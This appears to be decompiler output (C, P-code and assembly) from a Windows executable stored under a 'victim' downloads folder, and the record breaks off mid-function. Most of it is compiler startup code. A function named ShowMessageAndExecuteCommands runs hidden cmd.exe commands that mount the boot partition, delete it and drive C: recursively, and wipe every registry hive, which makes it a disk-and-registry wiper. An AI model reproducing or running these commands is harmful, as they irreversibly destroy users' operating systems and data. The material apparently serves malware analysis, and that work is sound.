(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x1bc, 4)
(ram, 0x140007010, 4) INDIRECT (register, 0x0, 4) , (const, 0x1bc, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x1bc, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x1bc, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x1bc, 4)
 ---  CALL (ram, 0x1400027c8, 8) , (register, 0x0, 4)
(ram, 0x140004510, 8) COPY (ram, 0x140004510, 8)
(ram, 0x140004520, 8) COPY (ram, 0x140004520, 8)
(ram, 0x140004590, 8) COPY (ram, 0x140004590, 8)
(ram, 0x1400045a0, 8) COPY (ram, 0x1400045a0, 8)
(ram, 0x1400045b0, 8) COPY (ram, 0x1400045b0, 8)
(ram, 0x1400045c0, 8) COPY (ram, 0x1400045c0, 8)
(ram, 0x1400045d0, 8) COPY (ram, 0x1400045d0, 8)
(ram, 0x1400045e0, 8) COPY (ram, 0x1400045e0, 8)
(ram, 0x1400045f0, 8) COPY (ram, 0x1400045f0, 8)
(ram, 0x140004630, 8) COPY (ram, 0x140004630, 8)
(ram, 0x140007008, 4) COPY (ram, 0x140007008, 4)
(ram, 0x14000700c, 4) COPY (ram, 0x14000700c, 4)
(ram, 0x140007010, 4) COPY (ram, 0x140007010, 4)
(ram, 0x140007018, 8) COPY (ram, 0x140007018, 8)
(ram, 0x140007020, 8) COPY (ram, 0x140007020, 8)
(ram, 0x140007028, 4) COPY (ram, 0x140007028, 4)
 ---  RETURN (const, 0x1, 4)
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x140007008, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001380, 1) , (register, 0x206, 1)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x195, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x195, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x195, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x195, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x195, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x195, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x195, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x195, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x195, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x195, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x195, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x195, 4)
(ram, 0x140007010, 4) INDIRECT (register, 0x0, 4) , (const, 0x195, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x195, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x195, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x195, 4)
 ---  CALL (ram, 0x1400027a0, 8)
(register, 0x0, 4) COPY (ram, 0x140007010, 4)
(ram, 0x140004510, 8) COPY (ram, 0x140004510, 8)
(ram, 0x140004520, 8) COPY (ram, 0x140004520, 8)
(ram, 0x140004590, 8) COPY (ram, 0x140004590, 8)
(ram, 0x1400045a0, 8) COPY (ram, 0x1400045a0, 8)
(ram, 0x1400045b0, 8) COPY (ram, 0x1400045b0, 8)
(ram, 0x1400045c0, 8) COPY (ram, 0x1400045c0, 8)
(ram, 0x1400045d0, 8) COPY (ram, 0x1400045d0, 8)
(ram, 0x1400045e0, 8) COPY (ram, 0x1400045e0, 8)
(ram, 0x1400045f0, 8) COPY (ram, 0x1400045f0, 8)
(ram, 0x140004630, 8) COPY (ram, 0x140004630, 8)
(ram, 0x140007008, 4) COPY (ram, 0x140007008, 4)
(ram, 0x14000700c, 4) COPY (ram, 0x14000700c, 4)
(ram, 0x140007010, 4) COPY (ram, 0x140007010, 4)
(ram, 0x140007018, 8) COPY (ram, 0x140007018, 8)
(ram, 0x140007020, 8) COPY (ram, 0x140007020, 8)
(ram, 0x140007028, 4) COPY (ram, 0x140007028, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 4) COPY (register, 0x0, 4)
(ram, 0x140004510, 8) COPY (ram, 0x140004510, 8)
(ram, 0x140004520, 8) COPY (ram, 0x140004520, 8)
(ram, 0x140004590, 8) COPY (ram, 0x140004590, 8)
(ram, 0x1400045a0, 8) COPY (ram, 0x1400045a0, 8)
(ram, 0x1400045b0, 8) COPY (ram, 0x1400045b0, 8)
(ram, 0x1400045c0, 8) COPY (ram, 0x1400045c0, 8)
(ram, 0x1400045d0, 8) COPY (ram, 0x1400045d0, 8)
(ram, 0x1400045e0, 8) COPY (ram, 0x1400045e0, 8)
(ram, 0x1400045f0, 8) COPY (ram, 0x1400045f0, 8)
(ram, 0x140004630, 8) COPY (ram, 0x140004630, 8)
(ram, 0x140007008, 4) COPY (ram, 0x140007008, 4)
(ram, 0x14000700c, 4) COPY (ram, 0x14000700c, 4)
(ram, 0x140007010, 4) COPY (ram, 0x140007010, 4)
(ram, 0x140007018, 8) COPY (ram, 0x140007018, 8)
(ram, 0x140007020, 8) COPY (ram, 0x140007020, 8)
(ram, 0x140007028, 4) COPY (ram, 0x140007028, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x20f, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x20f, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x20f, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x20f, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x20f, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x20f, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x20f, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x20f, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x20f, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x20f, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x20f, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x20f, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x20f, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x20f, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x20f, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x20f, 4)
 ---  CALL (ram, 0x1400081e0, 8) , (const, 0x3e8, 4)


Native Assembly Code:
PUSH R12
PUSH RBP
PUSH RDI
PUSH RSI
PUSH RBX
SUB RSP,0x20
MOV RBX,qword ptr [0x1400045a0]
MOV RBP,qword ptr [0x1400081e0]
XOR EDI,EDI
MOV RAX,qword ptr GS:[0x30]
MOV RSI,qword ptr [RAX + 0x8]
JMP 0x1400011c0
CMP RSI,RAX
JZ 0x140001320
MOV ECX,0x3e8
CALL RBP
MOV RAX,RDI
CMPXCHG.LOCK qword ptr [RBX],RSI
TEST RAX,RAX
JNZ 0x1400011b0
MOV RSI,qword ptr [0x1400045b0]
XOR EDI,EDI
MOV EAX,dword ptr [RSI]
CMP EAX,0x1
JZ 0x140001337
MOV EAX,dword ptr [RSI]
TEST EAX,EAX
JZ 0x1400013a0
MOV dword ptr [0x140007008],0x1
MOV EAX,dword ptr [RSI]
CMP EAX,0x1
JZ 0x14000134c
TEST EDI,EDI
JZ 0x14000136d
MOV RAX,qword ptr [0x140004510]
MOV RAX,qword ptr [RAX]
TEST RAX,RAX
JZ 0x140001223
XOR R8D,R8D
MOV EDX,0x2
XOR ECX,ECX
CALL RAX
CALL 0x140001af0
MOV RCX,qword ptr [0x140004630]
CALL qword ptr [0x1400081d8]
MOV RDX,qword ptr [0x140004590]
LEA RCX,[0x140001000]
MOV qword ptr [RDX],RAX
CALL 0x140002740
CALL 0x140001900
MOV EBX,dword ptr [0x140007028]
LEA EDI,[RBX + 0x1]
MOVSXD RDI,EDI
SHL RDI,0x3
MOV RCX,RDI
CALL 0x1400027e8
MOV R12,qword ptr [0x140007020]
MOV RBP,RAX
TEST EBX,EBX
JLE 0x1400013c0
SUB RDI,0x8
XOR EBX,EBX
MOV RCX,qword ptr [R12 + RBX*0x1]
CALL 0x140002808
LEA RSI,[RAX + 0x1]
MOV RCX,RSI
CALL 0x1400027e8
MOV R8,RSI
MOV qword ptr [RBP + RBX*0x1],RAX
MOV RDX,qword ptr [R12 + RBX*0x1]
MOV RCX,RAX
ADD RBX,0x8
CALL 0x1400027f0
CMP RDI,RBX
JNZ 0x140001280
ADD RDI,RBP
MOV qword ptr [RDI],0x0
MOV qword ptr [0x140007020],RBP
CALL 0x140001700
MOV RAX,qword ptr [0x140004520]
MOV R8,qword ptr [0x140007018]
MOV ECX,dword ptr [0x140007028]
MOV RAX,qword ptr [RAX]
MOV qword ptr [RAX],R8
MOV RDX,qword ptr [0x140007020]
CALL 0x140001633
MOV ECX,dword ptr [0x14000700c]
MOV dword ptr [0x140007010],EAX
TEST ECX,ECX
JZ 0x1400013c8
MOV EDX,dword ptr [0x140007008]
TEST EDX,EDX
JZ 0x140001380
ADD RSP,0x20
POP RBX
POP RSI
POP RDI
POP RBP
POP R12
RET
MOV RSI,qword ptr [0x1400045b0]
MOV EDI,0x1
MOV EAX,dword ptr [RSI]
CMP EAX,0x1
JNZ 0x1400011e1
MOV ECX,0x1f
CALL 0x140002798
MOV EAX,dword ptr [RSI]
CMP EAX,0x1
JNZ 0x140001200
MOV RDX,qword ptr [0x1400045d0]
MOV RCX,qword ptr [0x1400045c0]
CALL 0x1400027a8
MOV dword ptr [RSI],0x2
TEST EDI,EDI
JNZ 0x140001208
XOR EAX,EAX
XCHG qword ptr [RBX],RAX
JMP 0x140001208
CALL 0x1400027a0
MOV EAX,dword ptr [0x140007010]
ADD RSP,0x20
POP RBX
POP RSI
POP RDI
POP RBP
POP R12
RET
MOV RDX,qword ptr [0x1400045f0]
MOV RCX,qword ptr [0x1400045e0]
MOV dword ptr [RSI],0x1
CALL 0x1400027a8
JMP 0x1400011f5
MOV RDI,RAX
JMP 0x1400012b5
MOV ECX,EAX
CALL 0x1400027c8




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: WinMainCRTStartup
C Decompilation:

/* WARNING: Unknown calling convention */

int WinMainCRTStartup(void)

{
  int iVar1;
  
  *(undefined4 *)_refptr___mingw_app_type = 1;
  iVar1 = __tmainCRTStartup();
  return iVar1;
}



Pcode Representation:
(unique, 0x10000019, 8) CAST (ram, 0x140004550, 8)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0xb, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000019, 8) , (const, 0x1, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0xe, 4)
(register, 0x0, 4) CALL (ram, 0x140001180, 8)
(register, 0x0, 4) COPY (register, 0x0, 4)
(ram, 0x140004550, 8) COPY (ram, 0x140004550, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
SUB RSP,0x28
MOV RAX,qword ptr [0x140004550]
MOV dword ptr [RAX],0x1
CALL 0x140001180
NOP
NOP
ADD RSP,0x28
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: mainCRTStartup
C Decompilation:

/* WARNING: Unknown calling convention */

int mainCRTStartup(void)

{
  int iVar1;
  
  *(undefined4 *)_refptr___mingw_app_type = 0;
  iVar1 = __tmainCRTStartup();
  return iVar1;
}



Pcode Representation:
(unique, 0x10000019, 8) CAST (ram, 0x140004550, 8)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0xb, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000019, 8) , (const, 0x0, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0xe, 4)
(register, 0x0, 4) CALL (ram, 0x140001180, 8)
(register, 0x0, 4) COPY (register, 0x0, 4)
(ram, 0x140004550, 8) COPY (ram, 0x140004550, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
SUB RSP,0x28
MOV RAX,qword ptr [0x140004550]
MOV dword ptr [RAX],0x0
CALL 0x140001180
NOP
NOP
ADD RSP,0x28
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: atexit
C Decompilation:

int __cdecl atexit(_func_5014 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = _onexit((_onexit_t)param_1);
  return -(uint)(p_Var1 == (_onexit_t)0x0);
}



Pcode Representation:
(unique, 0x10000021, 8) CAST (register, 0x8, 8)
(register, 0x0, 8) CALL (ram, 0x1400027b0, 8) , (unique, 0x10000021, 8)
(register, 0x200, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x0, 8)
(unique, 0x14b00, 4) INT_ZEXT (register, 0x200, 1)
(unique, 0x1000001d, 4) INT_2COMP (unique, 0x14b00, 4)
(register, 0x0, 4) COPY (unique, 0x1000001d, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
SUB RSP,0x28
CALL 0x1400027b0
CMP RAX,0x1
SBB EAX,EAX
ADD RSP,0x28
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __gcc_register_frame
C Decompilation:

void __gcc_register_frame(void)

{
  atexit(__gcc_deregister_frame);
  return;
}



Pcode Representation:
(unique, 0x10000009, 8) PTRSUB (const, 0x0, 8) , (const, 0x140001440, 8)
 ---  CALL (ram, 0x140001410, 8) , (unique, 0x10000009, 8)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
LEA RCX,[0x140001440]
JMP 0x140001410




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __gcc_deregister_frame
C Decompilation:

void __gcc_deregister_frame(void)

{
  return;
}



Pcode Representation:
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: ShowMessageAndExecuteCommands
C Decompilation:

void ShowMessageAndExecuteCommands(void)

{
  BOOL BVar1;
  _STARTUPINFOA local_f8;
  _PROCESS_INFORMATION local_88;
  char *local_68 [4];
  char *local_48;
  char *local_40;
  char *local_38;
  char *local_30;
  char *local_28;
  char *local_20;
  uint local_c;
  
  MessageBoxA((HWND)0x0,&DAT_140004008,&DAT_140004000,0x30);
  local_68[0] = "cmd.exe /c mountvol x: /s";
  local_68[1] = "cmd.exe /c icacls x:";
  local_68[2] = "cmd.exe /c icacls c:";
  local_68[3] = "cmd.exe /c rd x: /s /q";
  local_48 = "cmd.exe /c reg delete HKCR /f";
  local_40 = "cmd.exe /c reg delete HKCU /f";
  local_38 = "cmd.exe /c reg delete HKLM /f";
  local_30 = "cmd.exe /c reg delete HKU /f";
  local_28 = "cmd.exe /c reg delete HKCC /f";
  local_20 = "cmd.exe /c rd c: /s /q";
  local_c = 0;
  while( true ) {
    if (9 < local_c) {
      return;
    }
    memset(&local_f8,0,0x68);
    local_f8.cb = 0x68;
    local_f8.dwFlags = 1;
    local_f8.wShowWindow = 0;
    memset(&local_88,0,0x18);
    BVar1 = CreateProcessA((LPCSTR)0x0,local_68[(int)local_c],(LPSECURITY_ATTRIBUTES)0x0,
                           (LPSECURITY_ATTRIBUTES)0x0,0,0,(LPVOID)0x0,(LPCSTR)0x0,&local_f8,
                           &local_88);
    if (BVar1 == 0) break;
    WaitForSingleObject(local_88.hProcess,0xffffffff);
    CloseHandle(local_88.hProcess);
    CloseHandle(local_88.hThread);
    local_c = local_c + 1;
  }
  MessageBoxA((HWND)0x0,&DAT_140004150,"Hata",0x10);
  return;
}



Pcode Representation:
(unique, 0x10000102, 8) PTRSUB (const, 0x0, 8) , (const, 0x140004000, 8)
(unique, 0x1000010a, 8) PTRSUB (const, 0x0, 8) , (const, 0x140004008, 8)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0x17, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0x17, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0x17, 4)
(stack, 0xffffffffffffff78, 8) INDIRECT (stack, 0xffffffffffffff78, 8) , (const, 0x17, 4)
(stack, 0xffffffffffffff80, 8) INDIRECT (stack, 0xffffffffffffff80, 8) , (const, 0x17, 4)
 ---  CALL (ram, 0x1400082e0, 8) , (const, 0x0, 8) , (unique, 0x1000010a, 8) , (unique, 0x10000102, 8) , (const, 0x30, 4)
(stack, 0xffffffffffffff98, 8) COPY (const, 0x14000403e, 8)
(stack, 0xffffffffffffffa0, 8) COPY (const, 0x140004058, 8)
(stack, 0xffffffffffffffa8, 8) COPY (const, 0x14000406d, 8)
(stack, 0xffffffffffffffb0, 8) COPY (const, 0x140004082, 8)
(stack, 0xffffffffffffffb8, 8) COPY (const, 0x140004099, 8)
(stack, 0xffffffffffffffc0, 8) COPY (const, 0x1400040b7, 8)
(stack, 0xffffffffffffffc8, 8) COPY (const, 0x1400040d5, 8)
(stack, 0xffffffffffffffd0, 8) COPY (const, 0x1400040f3, 8)
(stack, 0xffffffffffffffd8, 8) COPY (const, 0x140004110, 8)
(stack, 0xffffffffffffffe0, 8) COPY (const, 0x14000412e, 8)
(stack, 0xfffffffffffffff4, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x14000161b, 1)
(stack, 0xfffffffffffffff4, 4) MULTIEQUAL (stack, 0xfffffffffffffff4, 4) , (unique, 0x6b00, 4)
(stack, 0xffffffffffffffe0, 8) MULTIEQUAL (stack, 0xffffffffffffffe0, 8) , (stack, 0xffffffffffffffe0, 8)
(stack, 0xffffffffffffffd8, 8) MULTIEQUAL (stack, 0xffffffffffffffd8, 8) , (stack, 0xffffffffffffffd8, 8)
(stack, 0xffffffffffffffd0, 8) MULTIEQUAL (stack, 0xffffffffffffffd0, 8) , (stack, 0xffffffffffffffd0, 8)
(stack, 0xffffffffffffffc8, 8) MULTIEQUAL (stack, 0xffffffffffffffc8, 8) , (stack, 0xffffffffffffffc8, 8)
(stack, 0xffffffffffffffc0, 8) MULTIEQUAL (stack, 0xffffffffffffffc0, 8) , (stack, 0xffffffffffffffc0, 8)
(stack, 0xffffffffffffffb8, 8) MULTIEQUAL (stack, 0xffffffffffffffb8, 8) , (stack, 0xffffffffffffffb8, 8)
(stack, 0xffffffffffffffb0, 8) MULTIEQUAL (stack, 0xffffffffffffffb0, 8) , (stack, 0xffffffffffffffb0, 8)
(stack, 0xffffffffffffffa8, 8) MULTIEQUAL (stack, 0xffffffffffffffa8, 8) , (stack, 0xffffffffffffffa8, 8)
(stack, 0xffffffffffffffa0, 8) MULTIEQUAL (stack, 0xffffffffffffffa0, 8) , (stack, 0xffffffffffffffa0, 8)
(stack, 0xffffffffffffff98, 8) MULTIEQUAL (stack, 0xffffffffffffff98, 8) , (stack, 0xffffffffffffff98, 8)
(stack, 0xffffffffffffff80, 8) MULTIEQUAL (stack, 0xffffffffffffff80, 8) , (stack, 0xffffffffffffff80, 8)
(stack, 0xffffffffffffff78, 8) MULTIEQUAL (stack, 0xffffffffffffff78, 8) , (stack, 0xffffffffffffff78, 8)
(stack, 0xffffffffffffff48, 2) MULTIEQUAL (stack, 0xffffffffffffff48, 2) , (stack, 0xffffffffffffff48, 2)
(stack, 0xffffffffffffff44, 4) MULTIEQUAL (stack, 0xffffffffffffff44, 4) , (stack, 0xffffffffffffff44, 4)
(stack, 0xffffffffffffff08, 4) MULTIEQUAL (stack, 0xffffffffffffff08, 4) , (stack, 0xffffffffffffff08, 4)
(unique, 0xe600, 1) INT_LESS (const, 0x9, 4) , (stack, 0xfffffffffffffff4, 4)
 ---  CBRANCH (ram, 0x140001514, 1) , (unique, 0xe600, 1)
 ---  RETURN (const, 0x0, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff08, 8)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0x6b, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0x6b, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0x6b, 4)
(stack, 0xffffffffffffff78, 8) INDIRECT (stack, 0xffffffffffffff78, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffff80, 8) INDIRECT (stack, 0xffffffffffffff80, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffff98, 8) INDIRECT (stack, 0xffffffffffffff98, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffa0, 8) INDIRECT (stack, 0xffffffffffffffa0, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffa8, 8) INDIRECT (stack, 0xffffffffffffffa8, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffb0, 8) INDIRECT (stack, 0xffffffffffffffb0, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffc0, 8) INDIRECT (stack, 0xffffffffffffffc0, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffc8, 8) INDIRECT (stack, 0xffffffffffffffc8, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffd8, 8) INDIRECT (stack, 0xffffffffffffffd8, 8) , (const, 0x6b, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (stack, 0xffffffffffffffe0, 8) , (const, 0x6b, 4)
(stack, 0xfffffffffffffff4, 4) INDIRECT (stack, 0xfffffffffffffff4, 4) , (const, 0x6b, 4)
 ---  CALL (ram, 0x1400027f8, 8) , (unique, 0x4400, 8) , (const, 0x0, 4) , (const, 0x68, 8)
(stack, 0xffffffffffffff08, 4) COPY (const, 0x68, 4)
(stack, 0xffffffffffffff44, 4) COPY (const, 0x1, 4)
(stack, 0xffffffffffffff48, 2) COPY (const, 0x0, 2)
(unique, 0x4400, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff78, 8)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0x7c, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0x7c, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0x7c, 4)
(stack, 0xffffffffffffff78, 8) INDIRECT (stack, 0xffffffffffffff78, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffff80, 8) INDIRECT (stack, 0xffffffffffffff80, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffff98, 8) INDIRECT (stack, 0xffffffffffffff98, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffa0, 8) INDIRECT (stack, 0xffffffffffffffa0, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffa8, 8) INDIRECT (stack, 0xffffffffffffffa8, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffb0, 8) INDIRECT (stack, 0xffffffffffffffb0, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffc0, 8) INDIRECT (stack, 0xffffffffffffffc0, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffc8, 8) INDIRECT (stack, 0xffffffffffffffc8, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffd8, 8) INDIRECT (stack, 0xffffffffffffffd8, 8) , (const, 0x7c, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (stack, 0xffffffffffffffe0, 8) , (const, 0x7c, 4)
(stack, 0xfffffffffffffff4, 4) INDIRECT (stack, 0xfffffffffffffff4, 4) , (const, 0x7c, 4)
 ---  CALL (ram, 0x1400027f8, 8) , (unique, 0x4400, 8) , (const, 0x0, 4) , (const, 0x18, 8)
(unique, 0x1000016a, 4) CAST (stack, 0xfffffffffffffff4, 4)
(register, 0x0, 8) INT_SEXT (unique, 0x1000016a, 4)
(unique, 0x10000142, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff98, 8)
(unique, 0x4d00, 8) PTRADD (unique, 0x10000142, 8) , (register, 0x0, 8) , (const, 0x8, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4d00, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff78, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff08, 8)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0xa5, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0xa5, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0xa5, 4)
(stack, 0xffffffffffffff78, 8) INDIRECT (stack, 0xffffffffffffff78, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffff80, 8) INDIRECT (stack, 0xffffffffffffff80, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffff98, 8) INDIRECT (stack, 0xffffffffffffff98, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffa0, 8) INDIRECT (stack, 0xffffffffffffffa0, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffa8, 8) INDIRECT (stack, 0xffffffffffffffa8, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffb0, 8) INDIRECT (stack, 0xffffffffffffffb0, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffc0, 8) INDIRECT (stack, 0xffffffffffffffc0, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffc8, 8) INDIRECT (stack, 0xffffffffffffffc8, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffd8, 8) INDIRECT (stack, 0xffffffffffffffd8, 8) , (const, 0xa5, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (stack, 0xffffffffffffffe0, 8) , (const, 0xa5, 4)
(stack, 0xfffffffffffffff4, 4) INDIRECT (stack, 0xfffffffffffffff4, 4) , (const, 0xa5, 4)
(register, 0x0, 4) CALL (ram, 0x1400081a8, 8) , (const, 0x0, 8) , (unique, 0xdc00, 8) , (const, 0x0, 8) , (const, 0x0, 8) , (const, 0x0, 4) , (const, 0x0, 4) , (const, 0x0, 8) , (const, 0x0, 8) , (unique, 0x4400, 8) , (unique, 0x4400, 8)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400015df, 1) , (register, 0x206, 1)
(unique, 0x10000112, 8) COPY (const, 0x140004145, 8)
(unique, 0x1000011a, 8) PTRSUB (const, 0x0, 8) , (const, 0x140004150, 8)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0xba, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0xba, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0xba, 4)
(stack, 0xffffffffffffff98, 8) INDIRECT (stack, 0xffffffffffffff98, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffa0, 8) INDIRECT (stack, 0xffffffffffffffa0, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffa8, 8) INDIRECT (stack, 0xffffffffffffffa8, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffb0, 8) INDIRECT (stack, 0xffffffffffffffb0, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffc0, 8) INDIRECT (stack, 0xffffffffffffffc0, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffc8, 8) INDIRECT (stack, 0xffffffffffffffc8, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0xba, 4)
